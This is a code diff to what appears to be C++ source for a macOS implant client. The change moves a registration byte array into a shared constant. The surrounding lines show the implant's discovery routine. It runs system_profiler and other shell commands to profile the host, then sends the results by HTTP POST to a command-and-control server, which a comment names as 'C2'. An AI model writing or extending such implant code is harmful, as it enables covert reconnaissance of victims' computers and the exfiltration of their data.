@@ -3,6 +3,7 @@
 namespace client {
     const int RESP_BUFFER_SIZE = 65535;
     const std::string DOWNLOAD_FILE_NAME = "osx.download";
+    unsigned char REGISTRATION[] = {0x21, 0x70, 0x27, 0x20};
 
     std::string executeCmd(std::string cmd) {
         FILE *fp;
@@ -159,14 +160,12 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
         os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor Name/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";
 
         // send POST request with data to C2
-        unsigned char registration[] = {0x21, 0x70, 0x27, 0x20};
-
         unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
         unsigned char* response_buffer_ptr = &response_buffer[0];
         int response_length = 0;
         int* response_length_ptr = &response_length;
 
-        ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), registration, "", response_buffer_ptr, response_length_ptr);
+        ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), client::REGISTRATION, "", response_buffer_ptr, response_length_ptr);
 
         completed_discovery = true;
         
